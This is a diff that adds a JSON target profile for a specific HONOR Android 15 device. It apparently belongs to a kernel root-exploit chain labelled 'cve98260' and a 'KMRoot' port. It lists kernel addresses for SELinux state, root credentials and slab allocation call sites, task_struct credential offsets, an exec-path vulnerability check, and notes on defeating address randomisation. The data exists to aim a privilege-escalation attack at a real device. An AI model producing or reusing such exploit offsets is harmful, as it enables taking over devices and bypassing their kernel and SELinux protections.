@@ -1,0 +1,75 @@
+{
+  "schema": 1,
+  "profile_id": "66118",
+  "device": "HONOR AAK (AAK-AN00 / WIN RT), MagicOS 10.0.0.175(SP1)",
+  "kernel_release": "6.6.118-android15-8-gf17133276a57-abogki518694926-4k",
+  "kmi": "android15-8",
+  "soc": "Qualcomm sun (SM8750-family), qti/sun/sun:15/AQ3A.250214.001",
+  "boot_image_sha256": "3dacd60da1d8faa7e2548d22dbdd4fcc254d8892aa35d106c2aa6b632fcbff4e",
+  "image_sha256": "e8ce5dbf904ecb602b7c486ed365f0812d71d1696bddf79d188f6872906f9c79",
+  "cve98260": {
+    "LINK_SELINUX_STATE": "0xffffffc0823ba418",
+    "LINK_INIT_USER_NS": "0xffffffc08218ef98",
+    "LINK_ROOT_USER": "0xffffffc08218f228",
+    "LINK_INIT_GROUPS": "0xffffffc082190788",
+    "LINK_INIT_UCOUNTS": "0xffffffc082190cf8",
+    "LINK_ALLOC_TIMER": "0xffffffc0803aec40",
+    "LINK_ALLOC_CRED": "0xffffffc0802536a0",
+    "LINK_ALLOC_TASK": "0xffffffc0801e0e48",
+    "GEO_SELINUX_WRITE": "0xffffffc0823ba411",
+    "site_detail": {
+      "ALLOC_TIMER": {
+        "func": "do_timer_create",
+        "bl_addr": "0xffffffc0803aec3c",
+        "call_site": "0xffffffc0803aec40",
+        "inner": "0x94",
+        "target": "kmem_cache_alloc",
+        "cache_name": "posix_timers_cache"
+      },
+      "ALLOC_CRED": {
+        "func": "prepare_creds",
+        "bl_addr": "0xffffffc08025369c",
+        "call_site": "0xffffffc0802536a0",
+        "inner": "0x20",
+        "target": "kmem_cache_alloc",
+        "cache_name": "cred_jar"
+      },
+      "ALLOC_TASK": {
+        "func": "copy_process",
+        "bl_addr": "0xffffffc0801e0e44",
+        "call_site": "0xffffffc0801e0e48",
+        "inner": "0x144",
+        "target": "kmem_cache_alloc_node",
+        "cache_name": "task_struct_cachep"
+      }
+    },
+    "geometry": {
+      "task_struct.cred": "0x820",
+      "task_struct.real_cred": "0x818",
+      "task_struct.comm": "0x830",
+      "k_itimer.it": "0x78",
+      "cred.size": 184,
+      "k_itimer.size": "0x108",
+      "selinux_state.enforcing": 0,
+      "selinux_state.initialized": 1
+    },
+    "geometry_sizes": {
+      "task_struct": 4800,
+      "cred": 184,
+      "k_itimer": 264
+    },
+    "vuln_check": {
+      "begin_new_exec": "0xffffffc0801e7ccc",
+      "release_task_off": "0x3ec",
+      "down_read_killable_off": "0x508",
+      "posix_cpu_timers_exit_off": "0x6ac",
+      "exit_itimers_off": "0x6bc",
+      "order_verified": "release_task -> exec_mmap(inlined) -> posix_cpu_timers_exit -> exit_itimers"
+    },
+    "notes": {
+      "GEO_TASK_OBJSIZE": "not in boot.img; slab_task_objsize() reads /proc/slabinfo at runtime",
+      "GEO_POSIX_TIMER_OBJSIZE": "264 B from BTF sizeof(k_itimer) — matches the ColorOS-17 6.6.118 KMRoot port geometry (264 B / order-1 / ~31 objs)",
+      "CASLR": "98260 chain measures its own slide via tracefs; 64560 anchors need a ufshcd_issue_dev_cmd substitute on this kernel"
+    }
+  }
+}
